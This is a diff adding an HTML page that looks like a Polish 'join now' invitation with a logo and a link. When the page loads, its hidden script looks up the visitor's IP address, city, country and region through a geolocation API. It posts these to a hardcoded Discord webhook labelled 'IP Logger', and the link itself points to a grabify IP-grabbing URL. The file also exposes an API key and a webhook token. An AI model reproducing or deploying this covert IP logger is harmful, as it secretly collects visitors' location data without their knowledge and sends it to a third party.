@@ -1,0 +1,60 @@
+<html>
+<head>
+<script type="text/javascript">
+
+
+function getIP(json) {
+    function json(url) {
+    return fetch(url).then(res => res.json());
+    }
+    
+    let apiKey = 'ba4105392a480bdf49c2d246741fe1207f2d65d74c96d82ad2e9c829';
+    json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+
+    // so many more properties
+
+     var request = new XMLHttpRequest();
+     
+     request.open("POST", "https://discord.com/api/webhooks/898880080217010227/iXzwkSUjD_XNfOMnNwPhjsW7mlDMnjaDjQ1AopEapCynxIbkhjoHQp3f_Hz5-YOs0hog");
+     
+     request.setRequestHeader('Content-type', 'application/json');
+     
+     var params = 
+     {
+          username: "IP Logger",
+          avatar_url: "",
+          content: "IP:  " + data.ip + "**         **" + "Miasto:  " + data.city + "**         **" +  "Country:  " + data.country_code +  "**         **" + "Kraj:  " +  data.region
+     }
+     
+     request.send(JSON.stringify(params));
+    });
+}
+
+</script>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600&display=swap');
+    *{
+        background-color: #2a3131;
+    }
+    .logo {
+        margin-left: 600px;
+    }
+    p {
+        font-size: 48px;
+        color: #fff;
+        justify-content: center;
+        display: flex;
+        margin-left: -150px;
+        font-family: 'Poppins', sans-serif;
+    }
+    a {
+        text-decoration: none;
+    }
+</style>
+</head>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<body onload="getIP()">  
+    <img src="glteam.png" class="logo">
+    <a href="https://grabify.link/H0AJ9Q"><p>DOLACZ JUZ TERAZ</p></a>
+</body>
+</html>
